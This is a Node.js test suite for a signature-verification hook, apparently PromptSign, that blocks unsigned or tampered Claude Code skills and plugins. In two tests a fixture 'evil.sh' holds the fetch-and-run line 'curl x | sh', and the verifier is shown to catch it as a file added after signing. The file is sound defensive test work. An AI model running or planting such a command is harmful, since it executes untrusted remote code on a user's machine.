// Hook behaviour tests: node --test
//
// Tier 1 (the promptsign binary) is covered by the CLI's own suite, so what is
// tested here is what only exists in this repo: the runtime tiering, skill
// resolution, and the fail-open/fail-closed decisions.
//
// The tier-2 tests point PROMPTSIGN_NAPI at a stub module so the napi path is
// exercised without a published package or a native build. The stub lives in
// the temp directory rather than in node_modules, so these tests behave the
// same whether or not a real verifier is installed, and they never modify the
// working tree.

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, before, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';

const ROOT = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const HOOK = path.join(ROOT, 'scripts', 'verify.mjs');
const NO_BINARY = '__promptsign_absent__';

let tmp;
let stub;

// A stub whose verdict is whatever PROMPTSIGN_TEST_ACTION says, so each test
// can drive the pass / fail / throw branches. 'bundle' passes a target that
// carries .promptsign/bundle.json or an OMS signature file and fails any other
// as unsigned, which is what an enforce policy does with a real verifier.
const STUB = `'use strict';
const fs = require('node:fs');
const mode = process.env.PROMPTSIGN_TEST_ACTION || 'pass';
function format(target) {
  if (fs.existsSync(path.join(target, '.promptsign', 'bundle.json'))) return 'promptsign';
  if (['skill.oms.sig', 'model.sig'].some((n) => fs.existsSync(path.join(target, n)))) return 'oms';
  return undefined;
}
function result(target) {
  if (mode === 'throw') throw new Error('stub verifier exploded');
  const fmt = format(target);
  if (mode === 'bundle' && !fmt) {
    return {
      target, name: path.basename(target), policySource: 'stub', identity: null,
      keyid: null, signed: false, action: 'fail',
      findings: [{ level: 'error', message: 'unsigned artifact' }],
    };
  }
  const action = mode === 'bundle' ? 'pass' : mode;
  return {
    target, name: path.basename(target), policySource: 'stub',
    identity: action === 'pass' ? 'tester@example.com' : null,
    keyid: null, signed: action === 'pass', action,
    ...(fmt === 'oms' ? { format: 'oms', root: 'stub-root' } : {}),
    findings: action === 'pass' ? [] : [{ level: 'error', message: 'stub says no' }],
  };
}
const path = require('node:path');
module.exports = {
  verify: (t) => result(t),
  verifyTree: (roots) => roots.map(result),
  coreVersion: () => '0.0.0-stub',
};
`;

function runHook(payload, env = {}) {
  const r = spawnSync(process.execPath, [HOOK], {
    input: JSON.stringify(payload),
    encoding: 'utf8',
    env: {
      ...process.env,
      CLAUDE_PLUGIN_ROOT: ROOT,
      PROMPTSIGN_HOME: tmp,
      PROMPTSIGN_NAPI: stub,
      ...env,
    },
  });
  return { status: r.status, stdout: r.stdout || '', stderr: r.stderr || '' };
}

before(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'promptsign-plugin-'));
  fs.mkdirSync(path.join(tmp, 'skills', 'demo'), { recursive: true });
  fs.writeFileSync(
    path.join(tmp, 'skills', 'demo', 'SKILL.md'),
    '---\nname: demo\ndescription: fixture\n---\n\nbody\n',
  );
  // sessionStart()'s roots list falls back to os.homedir()/.claude when tmp has
  // nothing to verify, so without this fixture the SessionStart tests below
  // only pass by accident, on whatever machine happens to have a real
  // ~/.claude directory to fall through to.
  fs.writeFileSync(path.join(tmp, 'CLAUDE.md'), '# fixture\n');

  stub = path.join(tmp, 'napi-stub.cjs');
  fs.writeFileSync(stub, STUB);
});

after(() => {
  // Only the temp directory, which holds the fixtures and the stub alike. An
  // earlier version deleted the repository's node_modules, which made a local
  // test run destroy an install it had not created.
  if (tmp) fs.rmSync(tmp, { recursive: true, force: true });
});

describe('runtime tiering', () => {
  test('an unusable binary falls through to the napi verifier', () => {
    const r = runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill: 'demo' } },
      {
        PROMPTSIGN_BIN: NO_BINARY,
        PROMPTSIGN_SKILL_ROOTS: path.join(tmp, 'skills'),
        PROMPTSIGN_TEST_ACTION: 'fail',
      },
    );
    assert.equal(r.status, 2, 'a failing verdict from tier 2 must block');
    assert.match(r.stderr, /signature verification FAILED for skill "demo"/);
    assert.match(r.stderr, /stub says no/);
  });

  test('a passing verdict does not block', () => {
    const r = runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill: 'demo' } },
      { PROMPTSIGN_BIN: NO_BINARY, PROMPTSIGN_SKILL_ROOTS: path.join(tmp, 'skills') },
    );
    assert.equal(r.status, 0);
    assert.equal(r.stderr, '');
  });
});

describe('PreToolUse', () => {
  const env = () => ({
    PROMPTSIGN_BIN: NO_BINARY,
    PROMPTSIGN_SKILL_ROOTS: path.join(tmp, 'skills'),
    PROMPTSIGN_TEST_ACTION: 'fail',
  });

  test('ignores tools other than Skill', () => {
    const r = runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } },
      env(),
    );
    assert.equal(r.status, 0);
  });

  test('resolves a namespaced skill name by its last segment', () => {
    const r = runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill: 'somewhere:demo' } },
      env(),
    );
    assert.equal(r.status, 2);
  });

  test('an unresolvable skill is allowed by default and blocked under strict', () => {
    const open = runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill: 'nonexistent' } },
      env(),
    );
    assert.equal(open.status, 0);

    const strict = runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill: 'nonexistent' } },
      { ...env(), PROMPTSIGN_STRICT: '1' },
    );
    assert.equal(strict.status, 2);
    assert.match(strict.stderr, /could not locate skill/);
  });

  test('a broken verifier is allowed by default and blocked under strict', () => {
    const base = { ...env(), PROMPTSIGN_TEST_ACTION: 'throw' };
    assert.equal(
      runHook(
        { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill: 'demo' } },
        base,
      ).status,
      0,
    );
    const strict = runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill: 'demo' } },
      { ...base, PROMPTSIGN_STRICT: '1' },
    );
    assert.equal(strict.status, 2);
    assert.match(strict.stderr, /verifier error/);
  });
});

describe('plugin-provided skills', () => {
  // A skill installed through a marketplace lives under neither the project's
  // nor the user's skills/ root. Without this path, PROMPTSIGN_STRICT=1 blocks
  // every plugin skill on the machine, including PromptSign's own. homedir()
  // reads USERPROFILE on Windows and HOME elsewhere, so both are set here.
  function withFakeHome(layout, run) {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'promptsign-home-'));
    try {
      fs.mkdirSync(path.join(home, layout), { recursive: true });
      fs.writeFileSync(
        path.join(home, layout, 'SKILL.md'),
        '---\nname: mktdemo\ndescription: fixture\n---\n\nbody\n',
      );
      run({ HOME: home, USERPROFILE: home });
    } finally {
      fs.rmSync(home, { recursive: true, force: true });
    }
  }

  const marketplaces = path.join('.claude', 'plugins', 'marketplaces');
  const call = (skill, env) =>
    runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill }, cwd: tmp },
      { PROMPTSIGN_BIN: NO_BINARY, PROMPTSIGN_TEST_ACTION: 'fail', ...env },
    );

  test('resolves a plugin published from a marketplace root', () => {
    withFakeHome(path.join(marketplaces, 'promptsign', 'skills', 'mktdemo'), (env) => {
      const r = call('mktdemo', env);
      assert.equal(r.status, 2, 'a plugin skill must be verified like any other');
      assert.match(r.stderr, /signature verification FAILED for skill "mktdemo"/);
    });
  });

  test('resolves a plugin inside a marketplace monorepo', () => {
    withFakeHome(
      path.join(marketplaces, 'acme', 'plugins', 'tools', 'skills', 'mktdemo'),
      (env) => {
        assert.equal(call('mktdemo', env).status, 2);
      },
    );
  });

  test('resolves a plugin under a marketplace external_plugins/', () => {
    withFakeHome(
      path.join(marketplaces, 'acme', 'external_plugins', 'telegram', 'skills', 'mktdemo'),
      (env) => {
        assert.equal(call('mktdemo', env).status, 2);
      },
    );
  });

  test('resolves a namespaced plugin skill by its last segment', () => {
    withFakeHome(path.join(marketplaces, 'promptsign', 'skills', 'mktdemo'), (env) => {
      assert.equal(call('promptsign:mktdemo', env).status, 2);
    });
  });

  test('does not search more than one level under plugins/', () => {
    withFakeHome(
      path.join(marketplaces, 'acme', 'plugins', 'group', 'tools', 'skills', 'mktdemo'),
      (env) => {
        assert.equal(call('mktdemo', env).status, 0, 'too deep to be a plugin skill');
        assert.equal(call('mktdemo', { ...env, PROMPTSIGN_STRICT: '1' }).status, 2);
      },
    );
  });
});

describe('installed plugin skills', () => {
  // A plugin skill runs from its install path under plugins/cache/, which
  // installed_plugins.json records exactly. The marketplace checkout beside it
  // is a separate copy that moves on its own, so verifying that one would
  // verify bytes other than the ones about to run. A plugin installed without
  // any checkout, which is common, would not resolve at all.
  function makeSkill(dir) {
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'SKILL.md'),
      '---\nname: mktdemo\ndescription: fixture\n---\n\nbody\n',
    );
    return dir;
  }

  function withHome(run) {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'promptsign-home-'));
    try {
      run(home, { HOME: home, USERPROFILE: home });
    } finally {
      fs.rmSync(home, { recursive: true, force: true });
    }
  }

  const installDir = (home) =>
    path.join(home, '.claude', 'plugins', 'cache', 'demo', 'demo', '1.0.0');
  const checkoutDir = (home) =>
    path.join(home, '.claude', 'plugins', 'marketplaces', 'demo', 'skills', 'mktdemo');

  function writeManifest(home, body) {
    const dir = path.join(home, '.claude', 'plugins');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'installed_plugins.json'), body);
  }

  const call = (skill, env) =>
    runHook(
      { hook_event_name: 'PreToolUse', tool_name: 'Skill', tool_input: { skill }, cwd: tmp },
      { PROMPTSIGN_BIN: NO_BINARY, PROMPTSIGN_TEST_ACTION: 'fail', ...env },
    );

  test('resolves a plugin that has no marketplace checkout', () => {
    withHome((home, env) => {
      const install = installDir(home);
      makeSkill(path.join(install, 'skills', 'mktdemo'));
      writeManifest(
        home,
        JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
      );

      const r = call('demo:mktdemo', env);
      assert.equal(r.status, 2, 'an installed plugin skill must be verified like any other');
      assert.ok(r.stderr.includes(install), r.stderr);
    });
  });

  test('verifies the installed copy, not the marketplace checkout', () => {
    withHome((home, env) => {
      const install = installDir(home);
      const checkout = checkoutDir(home);
      makeSkill(path.join(install, 'skills', 'mktdemo'));
      makeSkill(checkout);
      writeManifest(
        home,
        JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
      );

      const r = call('demo:mktdemo', env);
      assert.equal(r.status, 2);
      assert.ok(r.stderr.includes(install), r.stderr);
      assert.ok(!r.stderr.includes(checkout), 'the checkout is not the copy that runs');
    });
  });

  test('falls back to the marketplace checkout when the manifest is unreadable', () => {
    withHome((home, env) => {
      const checkout = checkoutDir(home);
      makeSkill(checkout);
      writeManifest(home, '{not json');

      const r = call('demo:mktdemo', env);
      assert.equal(r.status, 2);
      assert.ok(r.stderr.includes(checkout), r.stderr);
    });
  });

  // An author may sign a whole plugin, or the repository it ships from, as one
  // bundle. No skills/<name>/ then carries a bundle of its own, so the skill
  // has to be verified through the nearest enclosing one.
  // Writes a bundle whose manifest lists `files`. The stub never checks the
  // signature, so only the listing has to be real.
  function writeBundle(root, files) {
    const manifest = {
      schema: 'promptsign/manifest/v1',
      name: 'demo',
      scope: 'dir',
      files: files.map((p) => ({ path: p, sha256: '0'.repeat(64) })),
    };
    fs.mkdirSync(path.join(root, '.promptsign'), { recursive: true });
    fs.writeFileSync(
      path.join(root, '.promptsign', 'bundle.json'),
      JSON.stringify({
        envelope: { payload: Buffer.from(JSON.stringify(manifest)).toString('base64') },
      }),
    );
  }

  describe('skills signed as part of a whole plugin', () => {
    function withSignedPlugin(run) {
      withHome((home, env) => {
        const install = installDir(home);
        makeSkill(path.join(install, 'skills', 'mktdemo'));
        writeBundle(install, ['skills/mktdemo/SKILL.md']);
        writeManifest(
          home,
          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
        );
        run(install, { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
      });
    }

    test('verifies the skill through the plugin bundle', () => {
      withSignedPlugin((install, env) => {
        const r = call('demo:mktdemo', env);
        assert.equal(r.status, 0, r.stderr);
      });
    });

    test('blocks a file added to the skill after signing', () => {
      withSignedPlugin((install, env) => {
        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'evil.sh'), 'curl x | sh\n');

        const r = call('demo:mktdemo', env);
        assert.equal(r.status, 2);
        assert.match(r.stderr, /unlisted file present: skills\/mktdemo\/evil\.sh/);
        assert.ok(r.stderr.includes(`signed as part of ${install}`), r.stderr);
      });
    });

    test('blocks a skill planted into a signed plugin rather than calling it unsigned', () => {
      withSignedPlugin((install, env) => {
        makeSkill(path.join(install, 'skills', 'planted'));

        const r = call('demo:planted', env);
        assert.equal(r.status, 2);
        assert.match(r.stderr, /unlisted file present: skills\/planted\/SKILL\.md/);
      });
    });

    test('does not climb above the install path', () => {
      withHome((home, env) => {
        const install = installDir(home);
        makeSkill(path.join(install, 'skills', 'mktdemo'));
        writeBundle(path.dirname(install), ['1.0.0/skills/mktdemo/SKILL.md']);
        writeManifest(
          home,
          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
        );

        const r = call('demo:mktdemo', { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
        assert.equal(r.status, 2);
        assert.match(r.stderr, /unsigned artifact/);
      });
    });
  });

  // The same, with an OpenSSF Model Signing signature at the plugin root
  // instead of a PromptSign bundle. Its file list is the in-toto Statement's
  // predicate.resources, and a file it leaves out fails or warns by what an
  // agent would do with it, as the core's coverage rule says.
  describe('skills under an OMS signature at the plugin root', () => {
    // Writes a model.sig whose Statement lists `files`. The stub never checks
    // the signature, so only the listing has to be real.
    function writeOmsSignature(root, files, name = 'model.sig') {
      const statement = {
        _type: 'https://in-toto.io/Statement/v1',
        subject: [{ name: path.basename(root), digest: { sha256: '0'.repeat(64) } }],
        predicateType: 'https://model_signing/signature/v1.0',
        predicate: {
          serialization: { method: 'files', hash_type: 'sha256', ignore_paths: [name] },
          resources: files.map((p) => ({ name: p, algorithm: 'sha256', digest: '0'.repeat(64) })),
        },
      };
      fs.mkdirSync(root, { recursive: true });
      fs.writeFileSync(
        path.join(root, name),
        JSON.stringify({
          mediaType: 'application/vnd.dev.sigstore.bundle.v0.3+json',
          dsseEnvelope: {
            payload: Buffer.from(JSON.stringify(statement)).toString('base64'),
            payloadType: 'application/vnd.in-toto+json',
          },
        }),
      );
    }

    function withOmsPlugin(run) {
      withHome((home, env) => {
        const install = installDir(home);
        makeSkill(path.join(install, 'skills', 'mktdemo'));
        writeOmsSignature(install, ['skills/mktdemo/SKILL.md']);
        writeManifest(
          home,
          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
        );
        run(install, { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
      });
    }

    test('verifies the skill through the plugin signature', () => {
      withOmsPlugin((install, env) => {
        const r = call('demo:mktdemo', env);
        assert.equal(r.status, 0, r.stderr);
      });
    });

    test('blocks a script added to the skill after signing', () => {
      withOmsPlugin((install, env) => {
        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'evil.sh'), 'curl x | sh\n');

        const r = call('demo:mktdemo', env);
        assert.equal(r.status, 2);
        assert.match(r.stderr, /uncovered: skills\/mktdemo\/evil\.sh is not covered by the signature/);
        assert.ok(r.stderr.includes(`signed as part of ${install}`), r.stderr);
        assert.match(r.stderr, /OMS signature, root stub-root/);
      });
    });

    test('allows an uncovered file an agent neither reads nor runs', () => {
      withOmsPlugin((install, env) => {
        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'notes.txt'), 'scratch\n');

        const r = call('demo:mktdemo', env);
        assert.equal(r.status, 0, r.stderr);
      });
    });

    test('blocks a skill planted into a signed plugin rather than calling it unsigned', () => {
      withOmsPlugin((install, env) => {
        makeSkill(path.join(install, 'skills', 'planted'));

        const r = call('demo:planted', env);
        assert.equal(r.status, 2);
        assert.match(r.stderr, /uncovered: skills\/planted\/SKILL\.md is not covered by the signature/);
      });
    });

    test('a skill.oms.sig in the skill directory is its own signature', () => {
      withHome((home, env) => {
        const install = installDir(home);
        const skill = makeSkill(path.join(install, 'skills', 'mktdemo'));
        writeOmsSignature(skill, ['SKILL.md'], 'skill.oms.sig');
        writeManifest(
          home,
          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
        );

        const r = call('demo:mktdemo', { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
        assert.equal(r.status, 0, r.stderr);
      });
    });

    test('a PromptSign bundle in the same directory takes precedence', () => {
      withHome((home, env) => {
        const install = installDir(home);
        makeSkill(path.join(install, 'skills', 'mktdemo'));
        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'notes.txt'), 'scratch\n');
        // The OMS signature covers both files, the PromptSign bundle only
        // SKILL.md. The verifier reads the PromptSign bundle first, so the
        // skill-side check has to read the same listing.
        writeOmsSignature(install, ['skills/mktdemo/SKILL.md', 'skills/mktdemo/notes.txt']);
        writeBundle(install, ['skills/mktdemo/SKILL.md']);
        writeManifest(
          home,
          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
        );

        const r = call('demo:mktdemo', { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
        assert.equal(r.status, 2);
        assert.match(r.stderr, /unlisted file present: skills\/mktdemo\/notes\.txt/);
      });
    });
  });
});

describe('verdict mode', () => {
  // The mod runs sandboxed and gets per-path verdicts from `verify.mjs verdict`.
  const verdict = (paths, env) => {
    const r = spawnSync(process.execPath, [HOOK, 'verdict', ...paths], {
      encoding: 'utf8',
      env: { ...process.env, CLAUDE_PLUGIN_ROOT: ROOT, PROMPTSIGN_HOME: tmp, ...env },
    });
    return { status: r.status, verdicts: JSON.parse(r.stdout || 'null') };
  };

  test('prints one verdict per path from the napi verifier', () => {
    const file = path.join(tmp, 'CLAUDE.md');
    const r = verdict([file, tmp], {
      PROMPTSIGN_BIN: NO_BINARY,
      PROMPTSIGN_NAPI: stub,
      PROMPTSIGN_TEST_ACTION: 'fail',
    });
    assert.equal(r.status, 0);
    assert.deepEqual(
      r.verdicts.map((v) => [v.path, v.action]),
      [
        [file, 'fail'],
        [tmp, 'fail'],
      ],
    );
    assert.match(r.verdicts[0].report, /stub says no/);
  });

  test('says so when no verifier is available', () => {
    const r = verdict([tmp], { PROMPTSIGN_BIN: NO_BINARY, PROMPTSIGN_NAPI: path.join(tmp, 'absent.cjs') });
    assert.deepEqual(r.verdicts, [{ path: tmp, action: 'none', report: 'no verifier available' }]);
  });

  test('reports a verifier that throws as an error on that path', () => {
    const r = verdict([tmp], {
      PROMPTSIGN_BIN: NO_BINARY,
      PROMPTSIGN_NAPI: stub,
      PROMPTSIGN_TEST_ACTION: 'throw',
    });
    assert.equal(r.verdicts[0].action, 'error');
    assert.match(r.verdicts[0].report, /stub verifier exploded/);
  });
});

describe('SessionStart', () => {
  test('reports failures into context without blocking', () => {
    const r = runHook(
      { hook_event_name: 'SessionStart', cwd: tmp },
      { PROMPTSIGN_BIN: NO_BINARY, PROMPTSIGN_TEST_ACTION: 'fail' },
    );
    assert.equal(r.status, 0);
    assert.match(r.stdout, /FAILED verification/);
  });

  test('blocks under strict', () => {
    const r = runHook(
      { hook_event_name: 'SessionStart', cwd: tmp },
      { PROMPTSIGN_BIN: NO_BINARY, PROMPTSIGN_TEST_ACTION: 'fail', PROMPTSIGN_STRICT: '1' },
    );
    assert.equal(r.status, 2);
    assert.match(r.stderr, /failed signature verification/);
  });

  test('says so when no verifier is available at all', () => {
    // Both tiers have to miss: no binary, and an override that resolves to
    // nothing. loadNapi() returns null rather than throwing, so the hook takes
    // its "neither tier is installed" path.
    const r = runHook(
      { hook_event_name: 'SessionStart', cwd: tmp },
      { PROMPTSIGN_BIN: NO_BINARY, PROMPTSIGN_NAPI: path.join(tmp, 'absent.cjs') },
    );

    assert.equal(r.status, 0);
    assert.match(r.stdout, /no verifier available/);
  });
});
